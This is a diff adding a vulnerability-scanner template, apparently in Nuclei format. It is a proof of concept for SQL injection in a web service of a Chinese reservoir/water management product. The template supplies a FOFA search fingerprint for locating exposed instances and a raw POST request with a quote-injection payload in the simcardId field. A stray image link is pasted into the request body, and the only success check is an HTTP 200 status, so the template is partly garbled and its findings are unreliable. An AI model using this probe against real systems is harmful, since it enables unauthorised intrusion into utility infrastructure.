@@ -1,0 +1,37 @@
+id: poc-ki7k0ktqyzzdduuf
+info:
+  name: 平升水库GetAllRechargeRecordsBySIMCardId存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ki7k0ktqyzzdduuf'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ki7k0ktqyzzdduuf
+    fofa: body="js/PSExtend.js"
+http:
+- raw:
+  - 'POST /WebServices/SIMMaintainService.asmx/GetAllRechargeRecordsBySIMCardId HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept: */*
+
+    Connection: close
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 33
+
+    loginIdentifer=123&simcardId=-12''
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1739792838040-7cf0835d-fee4-4f7f-b5c1-031ff1c74611.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
